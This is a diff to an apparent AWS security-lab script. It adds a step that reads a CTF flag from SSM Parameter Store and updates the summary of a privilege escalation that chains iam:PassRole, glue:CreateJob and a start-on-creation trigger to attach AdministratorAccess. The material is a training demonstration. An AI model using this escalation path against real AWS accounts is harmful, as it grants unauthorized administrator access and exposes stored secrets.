@@ -347,12 +347,30 @@ else
 fi
 echo ""
 
+# [EXPLOIT]
+# Step 11: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/glue-004-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
@@ -362,6 +380,7 @@ echo "4. Created scheduled trigger: $TRIGGER_NAME with --start-on-creation"
 echo "5. Trigger fired immediately and executed the job"
 echo "6. Job attached AdministratorAccess policy to starting user"
 echo "7. Achieved: Administrator Access"
+echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER"
@@ -369,7 +388,7 @@ echo -e "  → (iam:PassRole + glue:CreateJob) → $JOB_NAME with $TARGET_ROLE"
 echo -e "  → (glue:CreateTrigger --start-on-creation) → $TRIGGER_NAME"
 echo -e "  → Job executes with admin role"
 echo -e "  → Attaches AdministratorAccess to $STARTING_USER"
-echo -e "  → Admin access achieved"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
